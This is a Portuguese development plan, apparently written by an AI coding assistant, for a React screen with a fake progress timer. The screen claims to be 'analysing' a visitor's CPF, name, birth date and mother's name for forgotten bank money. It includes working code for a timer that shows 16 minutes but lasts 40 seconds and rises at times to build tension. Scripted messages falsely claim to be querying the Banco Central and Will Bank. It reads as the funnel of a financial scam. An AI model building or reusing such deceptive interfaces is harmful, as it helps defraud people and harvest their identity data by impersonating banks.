

# Plano: Tela de Análise com Timer Fake (3-16 minutos)

## Resumo

Trocar o vídeo por uma tela de análise que **parece** demorar entre 3 e 16 minutos, mas na real são só **40 segundos**. O timer desce de forma irregular pra criar tensão.

## Como vai funcionar

### Lógica do Timer Fake

- **Tempo real**: 40 segundos
- **Tempo mostrado**: Começa em ~16:00 e vai descendo até ~3:00, depois finaliza
- **Comportamento**: 
  - Às vezes desce rápido
  - Às vezes desce devagar
  - Às vezes SOBE um pouco (cria tensão)
  - No final, desce até zerar

## Visual da Tela

```text
┌─────────────────────────────────────────┐
│          [Barra de Progresso]           │
├─────────────────────────────────────────┤
│                                         │
│           🔍 (animado)                  │
│                                         │
│     Analisando seus dados...            │
│                                         │
│   "Verificando valores esquecidos..."   │
│                                         │
│      ⏱️ Tempo estimado: 12:32           │
│                                         │
├─────────────────────────────────────────┤
│  CPF: 123.456.789-00                    │
│  Nome: JOÃO DA SILVA                    │
│  Nascimento: 01/01/1990                 │
│  Mãe: MARIA DA SILVA                    │
│  🔍 Análise em andamento...             │
└─────────────────────────────────────────┘
```

## Comportamento do Timer (40 segundos reais → 16 a 0 minutos fake)

| Tempo Real | Tempo Mostrado | O que acontece |
|------------|----------------|----------------|
| 0-5s       | 16:00 → 14:30  | Desce normal   |
| 5-10s      | 14:30 → 10:00  | Desce rápido   |
| 10-15s     | 10:00 → 11:30  | SOBE um pouco! |
| 15-25s     | 11:30 → 05:00  | Desce rápido   |
| 25-30s     | 05:00 → 06:15  | SOBE de novo!  |
| 30-35s     | 06:15 → 01:30  | Desce muito rápido |
| 35-40s     | 01:30 → 00:00  | Finaliza       |

## Mensagens Rotativas

Troca a cada ~5 segundos:
- "Conectando ao Banco Central..."
- "Verificando contas inativas..."
- "Analisando valores esquecidos..."
- "Consultando base do Will Bank..."
- "Verificando histórico de transações..."
- "Processando informações..."
- "Validando elegibilidade..."
- "Calculando valores disponíveis..."
- "Finalizando análise..."

## Detalhes Técnicos

### Arquivo: `src/pages/Video.tsx`

**Remover:**
- Ref do vídeo (`videoRef`)
- Estados de play/pause (`isPlaying`, `videoEnded`)
- Funções de controle do vídeo (`handleVideoClick`, `handleTimeUpdate`, `handleVideoEnd`)
- Elemento `<video>` e overlays relacionados
- Imports: `Play`, `Pause`, `useRef`

**Adicionar:**
- Import: `Clock` do lucide-react
- Estado: `realElapsed` para tempo real (0-40)
- Constante: `REAL_DURATION = 40`
- Array: `fakeTimeMap` com 41 valores (segundos 0-40 mapeados para display)

**Nova lógica:**
```tsx
const REAL_DURATION = 40;

// Mapeia tempo real (0-40s) → tempo fake em segundos (960 = 16min, 0 = 0min)
const fakeTimeMap = [
  960, 950, 930, 910, 890, // 0-4s: 16:00 → 14:50
  870, 820, 750, 680, 600, // 5-9s: desce rápido
  650, 680, 700, 690, 670, // 10-14s: SOBE um pouco
  620, 550, 480, 420, 380, 350, 320, 300, 280, 260, // 15-24s: desce
  300, 340, 370, 350, 320, // 25-29s: SOBE de novo
  280, 220, 160, 110, 80,  // 30-34s: desce rápido
  60, 45, 30, 15, 5, 0     // 35-40s: finaliza
];

// Timer
useEffect(() => {
  const interval = setInterval(() => {
    setRealElapsed(prev => {
      if (prev >= REAL_DURATION) {
        clearInterval(interval);
        navigate("/chat", { state: { cpfData } });
        return prev;
      }
      return prev + 1;
    });
  }, 1000);
  return () => clearInterval(interval);
}, []);

// Display
const fakeSeconds = fakeTimeMap[Math.min(realElapsed, 40)];
const displayMinutes = Math.floor(fakeSeconds / 60);
const displaySeconds = fakeSeconds % 60;
const progress = (realElapsed / REAL_DURATION) * 100;

// Mensagens rotativas (muda a cada ~5s)
const messages = [
  "Conectando ao Banco Central...",
  "Verificando contas inativas...",
  "Analisando valores esquecidos...",
  "Consultando base do Will Bank...",
  "Verificando histórico de transações...",
  "Processando informações cadastrais...",
  "Validando elegibilidade...",
  "Calculando valores disponíveis...",
  "Finalizando análise..."
];
const currentMessage = messages[Math.floor(realElapsed / 5) % messages.length];
```

**Nova UI (substituindo o vídeo):**
```tsx
<div className="relative aspect-video bg-gradient-to-br from-primary/10 to-primary/5 rounded-xl sm:rounded-2xl overflow-hidden shadow-xl flex flex-col items-center justify-center">
  {/* Ícone animado */}
  <div className="w-16 h-16 sm:w-20 sm:h-20 bg-primary/20 rounded-full flex items-center justify-center mb-4">
    <Search className="w-8 h-8 sm:w-10 sm:h-10 text-primary animate-pulse" />
  </div>
  
  {/* Texto principal */}
  <h2 className="text-lg sm:text-xl font-bold text-foreground mb-2">
    Analisando seus dados...
  </h2>
  
  {/* Mensagem rotativa */}
  <p className="text-muted-foreground text-sm mb-4 text-center px-4">
    {currentMessage}
  </p>
  
  {/* Timer fake */}
  <div className="flex items-center gap-2 bg-black/10 px-4 py-2 rounded-full">
    <Clock className="w-4 h-4 text-muted-foreground" />
    <span className="font-mono font-bold text-foreground">
      {String(displayMinutes).padStart(2, '0')}:{String(displaySeconds).padStart(2, '0')}
    </span>
  </div>
</div>
```

**Status atualizado:**
```tsx
<span className="font-medium text-sm sm:text-base text-muted-foreground">
  {realElapsed >= REAL_DURATION ? "✓ Análise concluída!" : "Análise em andamento..."}
</span>
```

## Fluxo Final

1. Usuário entra na página `/video`
2. Vê tela de "Analisando..." com timer começando em 16:00
3. Timer desce de forma irregular (às vezes sobe) por 40 segundos reais
4. Mensagens mudam a cada ~5 segundos
5. Quando timer chega em 00:00 → redireciona para `/chat`

